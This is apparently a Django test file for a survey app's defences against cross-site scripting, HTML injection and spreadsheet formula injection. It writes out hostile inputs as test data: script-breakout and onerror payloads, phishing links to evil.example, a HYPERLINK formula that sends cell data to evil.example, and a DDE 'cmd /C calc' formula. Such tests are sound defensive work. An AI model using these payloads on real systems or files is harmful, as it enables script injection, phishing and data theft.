"""Text typed into a survey must stay text: in the results page, the lists, the
spreadsheet export and the invitation mail."""

import csv
import io
import json
import re
from pathlib import Path
from unittest import mock

from django.core import mail
from django.test import TestCase, override_settings
from django.urls import reverse

from surveys import views
from surveys.forms import SurveyQuestionForm
from surveys.models import Survey, SurveyQuestion
from surveys.tests.support import build_survey, close, hr_client, submit

CACHE = {"default": {"BACKEND": "django.core.cache.backends.locmem.LocMemCache"}}

SCRIPT_BREAKOUT = "</script><b id='pwned'>x</b>"


@override_settings(CACHES=CACHE, SURVEYS_MIN_RESPONSES=1)
class ChartDataTests(TestCase):
    @classmethod
    def setUpTestData(cls):
        cls.built = build_survey(tag="xss", anonymous=False, people=2)
        cls.choice = SurveyQuestion.objects.create(
            survey=cls.built.survey,
            sequence=3,
            type=SurveyQuestion.TYPE_CHOICE,
            question="Where?",
            options=[SCRIPT_BREAKOUT, "fine"],
        )
        submit(cls.built, cls.built.invitations[0])

    def test_option_labels_cannot_close_the_script_that_draws_the_chart(self):
        page = hr_client(self.built).get(
            reverse("survey-results-tab", args=[self.built.survey.pk])
        )
        html = page.content.decode()
        self.assertNotIn("</script><b id='pwned'>", html)
        self.assertNotIn("<b id='pwned'>", html)
        match = re.search(
            r'<script id="survey-chart-data" type="application/json">(.*?)</script>',
            html,
            re.S,
        )
        self.assertIsNotNone(match, "chart data is not handed over with json_script")
        labels = [
            label
            for item in json.loads(match.group(1))
            for label in (item["labels"] or [])
        ]
        self.assertIn(SCRIPT_BREAKOUT, labels)  # the text itself arrives intact

    def test_the_chart_script_no_longer_embeds_data_with_safe(self):
        template = (
            Path(__file__).resolve().parents[1] / "templates/surveys/tabs/results.html"
        ).read_text(encoding="utf-8")
        self.assertNotIn("|safe", template)

    def test_an_option_that_looks_like_markup_is_refused_by_the_form(self):
        form = SurveyQuestionForm(
            data={
                "question": "Q",
                "type": "choice",
                "options_text": "<img src=x onerror=alert(1)>\nfine",
            }
        )
        self.assertFalse(form.is_valid())
        self.assertIn("options_text", form.errors)


@override_settings(CACHES=CACHE)
class ListMarkupTests(TestCase):
    TITLE = '<a href="https://evil.example/login">Sign in</a><img src="https://evil.example/p.gif">'

    @classmethod
    def setUpTestData(cls):
        cls.built = build_survey(tag="lst", people=1, title="Quarterly pulse")
        # stored directly: the form's script check does not object to links or images
        Survey.objects.filter(pk=cls.built.survey.pk).update(title=cls.TITLE)

    def test_a_title_with_a_link_or_image_is_shown_as_text(self):
        for name in ("surveys-list", "surveys-card"):
            with self.subTest(name):
                page = hr_client(self.built).get(reverse(name), HTTP_HX_REQUEST="true")
                html = page.content.decode()
                self.assertNotIn('<a href="https://evil.example', html)
                self.assertNotIn('<img src="https://evil.example', html)
                self.assertIn("&lt;a href=", html)


@override_settings(CACHES=CACHE, SURVEYS_MIN_RESPONSES=1)
class SpreadsheetExportTests(TestCase):
    PAYLOADS = [
        '=HYPERLINK("https://evil.example/?d="&A1,"x")',
        "+1+1",
        "-1+1",
        "@SUM(1+1)",
        "\t=1+1",
        "\r=1+1",
    ]

    def rows(self, built):
        export = hr_client(built).get(reverse("survey-export", args=[built.survey.pk]))
        self.assertIn("text/csv", export["Content-Type"])
        return list(csv.reader(io.StringIO(export.content.decode("utf-8-sig"))))

    def test_nothing_in_the_export_can_run_as_a_formula(self):
        for anonymous in (False, True):
            with self.subTest(anonymous=anonymous):
                built = build_survey(
                    tag=f"csv{int(anonymous)}",
                    anonymous=anonymous,
                    people=len(self.PAYLOADS),
                )
                SurveyQuestion.objects.filter(pk=built.note.pk).update(
                    question="=cmd|' /C calc'!A0"
                )
                for payload, invitation in zip(self.PAYLOADS, built.invitations):
                    submit(built, invitation, note=payload)
                close(built)
                rows = self.rows(built)
                cells = [cell for row in rows for cell in row if cell]
                for cell in cells:
                    self.assertFalse(
                        cell.startswith(("=", "+", "-", "@", "\t", "\r")),
                        f"{cell!r} would run as a formula",
                    )
                header = rows[0]
                self.assertIn("'=cmd|' /C calc'!A0", header)
                written = {row[-1] for row in rows[1:]}
                self.assertIn("'+1+1", written)
                self.assertIn("'-1+1", written)


@override_settings(CACHES=CACHE)
class InvitationMailTests(TestCase):
    TITLE = "Q&A: employees' view"

    def test_the_plain_text_mail_is_not_html_escaped(self):
        built = build_survey(
            tag="mail", people=1, status=Survey.STATUS_DRAFT, title=self.TITLE
        )
        for invitation in built.invitations:
            invitation.delete()
        backend = mock.Mock(
            configuration=True,
            dynamic_from_email_with_display_name="HR <hr@test.horilla>",
        )
        with self.settings(
            EMAIL_BACKEND="django.core.mail.backends.locmem.EmailBackend"
        ), mock.patch.object(
            views, "ConfiguredEmailBackend", return_value=backend
        ), mock.patch(
            "django.core.mail.EmailMultiAlternatives.send",
            lambda message: mail.outbox.append(message) or 1,
        ):
            hr_client(built).post(reverse("survey-open", args=[built.survey.pk]))

        self.assertTrue(mail.outbox)
        for message in mail.outbox:
            self.assertIn(self.TITLE, message.subject)
            self.assertNotIn("&amp;", message.subject)
            self.assertNotIn("&#x27;", message.subject)
            self.assertIn(self.TITLE, message.body)
            self.assertNotIn("&amp;", message.body)
            self.assertNotIn("&#x27;", message.body)
            html = message.alternatives[0][0]
            self.assertIn("Q&amp;A", html)  # the HTML part stays escaped
